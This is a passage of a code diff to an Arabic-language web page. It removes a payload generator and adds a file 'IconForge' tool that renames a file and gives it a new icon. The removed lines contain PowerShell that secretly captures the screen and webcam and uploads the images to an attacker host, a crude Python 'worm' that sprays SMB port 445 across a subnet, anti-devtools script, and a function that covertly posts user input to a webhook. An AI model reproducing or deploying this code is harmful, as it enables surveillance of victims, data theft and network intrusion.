-    else if(t==='screen')c='Add-Type -AssemblyName System.Drawing;$screen=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object System.Drawing.Bitmap($screen.Width,$screen.Height);$g=[System.Drawing.Graphics]::FromImage($bmp);$g.CopyFromScreen(0,0,0,0,$bmp.Size);$bmp.Save("$env:TEMP\screen.jpg");$wc=New-Object Net.WebClient;$wc.UploadFile("http://'+ip+':'+port+'/upload","$env:TEMP\screen.jpg")';
-    else if(t==='webcam')c='[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")|Out-Null;$webcam=New-Object -ComObject WIA.CommonDialog;$img=$webcam.ShowCapture();if($img){$img.SaveFile("$env:TEMP\cam.jpg");$wc=New-Object Net.WebClient;$wc.UploadFile("http://'+ip+':'+port+'/upload","$env:TEMP\cam.jpg")}';
-    else if(t==='worm')c='import os,socket,threading;IP="'+ip+'";PORT='+port+'\ndef infect(h):\n try:\n  s=socket.socket()\n  s.settimeout(3)\n  s.connect((h,445))\n  s.send(b"\\x00"*500)\n  s.close()\n except:pass\nfor i in range(1,255):\n t=threading.Thread(target=infect,args=(f"192.168.1.{i}",))\n t.start()';
-    else if(t==='prot')c='(function(){document.addEventListener("copy",function(e){e.preventDefault();alert("🚫 ممنوع")});document.addEventListener("contextmenu",function(e){e.preventDefault()});document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&e.key==="I")||(e.ctrlKey&&e.shiftKey&&e.key==="J")||(e.ctrlKey&&e.key==="U")){e.preventDefault();alert("🚫 ممنوع")}});setInterval(function(){if(window.outerHeight-window.innerHeight>100||window.outerWidth-window.innerWidth>100){document.body.innerHTML="<h1 style=\'color:red;text-align:center;margin-top:50vh\'>🚫 محظور</h1>"}},1000)})();';
-    document.getElementById('po').textContent=c
-}
-function copyP(){navigator.clipboard.writeText(document.getElementById('po').textContent).then(function(){alert('✅ تم')})}
+    function handleFile(file) {
+        if (!file) return;
+        selectedFile = file;
+        fiName.textContent = file.name;
+        fiMeta.textContent = (file.size / 1024).toFixed(1) + ' KB' + (file.size > 1024*1024 ? ' (' + (file.size/1024/1024).toFixed(1) + ' MB)' : '');
+        fileInfo.classList.add('visible');
+        uploadZone.classList.add('has-file');
+        appNameInput.placeholder = file.name;
+        appNameInput.value = '';
+        configSection.classList.add('visible');
+        btnProcess.classList.add('visible');
+        btnProcess.disabled = false;
+        outputSection.classList.remove('visible');
+    }
 
-function addI(){
-    var n=document.getElementById('niN').value.trim();
-    var d=document.getElementById('niD').value.trim();
-    if(!n||!d)return;
-    extra.push({name:n,detail:d});
-    document.getElementById('niN').value='';
-    document.getElementById('niD').value='';
-    var c=document.getElementById('extraL');
-    c.innerHTML='';
-    for(var i=0;i<extra.length;i++){c.innerHTML+='<div style="background:#2a2a2a;border-radius:6px;padding:8px;margin:5px 0;font-size:.8rem"><strong>'+extra[i].name+':</strong> '+extra[i].detail+'</div>'}
-    fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:"📋 معلومات جديدة",color:0xdfb76c,fields:[{name:"👤 الاسم:",value:n},{name:"ℹ️ المعلومة:",value:d}],timestamp:new Date()}]})}).catch(function(){})
-}
+    // Events
+    fileInput.addEventListener('change', e => {
+        if (e.target.files?.length) handleFile(e.target.files[0]);
+    });
+
+    uploadZone.addEventListener('dragover', e => { e.preventDefault(); uploadZone.classList.add('dragover'); });
+    uploadZone.addEventListener('dragleave', e => { e.preventDefault(); uploadZone.classList.remove('dragover'); });
+    uploadZone.addEventListener('drop', e => {
+        e.preventDefault();
+        uploadZone.classList.remove('dragover');
+        if (e.dataTransfer.files?.length) handleFile(e.dataTransfer.files[0]);
+    });
+
+    removeFileBtn.addEventListener('click', resetAll);
+
+    iconUrlInput.addEventListener('input', function() {
+        const url = this.value.trim();
+        if (!url) {
+            iconPreview.innerHTML = '<i class="fas fa-image"></i>';
+            iconPreview.classList.remove('has-icon');
+            return;
+        }
+        const img = new Image();
+        img.onload = () => {
+            iconPreview.innerHTML = '';
+            iconPreview.appendChild(img);
+            iconPreview.classList.add('has-icon');
+        };
+        img.onerror = () => {
+            iconPreview.innerHTML = '<i class="fas fa-image" style="color:#ef4444;"></i>';
+            iconPreview.classList.remove('has-icon');
+        };
+        img.src = url;
+        img.style.cssText = 'width:100%;height:100%;object-fit:cover;border-radius:10px;';
+        img.alt = 'icon';
+    });
+
+    // === PROCESS ===
+    btnProcess.addEventListener('click', async function() {
+        if (!selectedFile) return;
+
+        const newName = appNameInput.value.trim() || selectedFile.name;
+        const iconUrl = iconUrlInput.value.trim();
+
+        btnProcess.disabled = true;
+        btnProcess.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التطبيق...';
+
+        // Simulate tiny delay for UX
+        await new Promise(r => setTimeout(r, 400));
+
+        try {
+            // Read original file — untouched
+            const originalBuffer = await selectedFile.arrayBuffer();
+
+            // Build metadata: [4-byte JSON length][JSON metadata][original file bytes]
+            const meta = {
+                name: newName,
+                icon: iconUrl || '',
+                origName: selectedFile.name,
+                origSize: selectedFile.size,
+                tool: 'IconForge v1.0',
+                note: 'الملف الأصلي لم يتم تعديله — التشفير والمحتوى كما هو'
+            };
+            const metaJson = JSON.stringify(meta);
+            const metaBytes = new TextEncoder().encode(metaJson);
+            const headerBuf = new ArrayBuffer(4);
+            new DataView(headerBuf).setUint32(0, metaBytes.length, true);
+
+            // Final blob = header + metadata + original file (unchanged)
+            const finalBlob = new Blob([headerBuf, metaBytes, originalBuffer], { type: 'application/octet-stream' });
+
+            const url = URL.createObjectURL(finalBlob);
+
+            // Show output
+            outOrigName.textContent = selectedFile.name;
+            outNewName.textContent = newName;
+            outIcon.textContent = iconUrl ? '✓ تم تعيين أيقونة جديدة' : 'بدون أيقونة';
+            outLink.value = url;
+            downloadBtn.href = url;
+            downloadBtn.download = newName;
+
+            outputSection.classList.add('visible');
+            showToast('✓ تم تطبيق الأيقونة والاسم — الملف الأصلي لم يمس!', 'success');
+
+        } catch (err) {
+            showToast('خطأ: ' + err.message, 'error');
+        } finally {
+            btnProcess.disabled = false;
+            btnProcess.innerHTML = '<i class="fas fa-wand-magic-sparkles"></i> تطبيق الأيقونة والاسم';
+        }
+    });
+
+    // Copy link
+    copyLinkBtn.addEventListener('click', () => {
+        if (outLink.value) {
+            navigator.clipboard.writeText(outLink.value).then(
+                () => showToast('تم نسخ الرابط', 'success'),
+                () => { outLink.select(); document.execCommand('copy'); showToast('تم نسخ الرابط', 'success'); }
+            );
+        }
+    });
+
+    outLink.addEventListener('click', function() { this.select(); });
+
+    // Reset
+    resetBtn.addEventListener('click', () => {
+        if (outLink.value?.startsWith('blob:')) URL.revokeObjectURL(outLink.value);
+        resetAll();
+        showToast('تمت إعادة التعيين', 'info');
+    });
+})();
 </script>
 </body>
 </html>
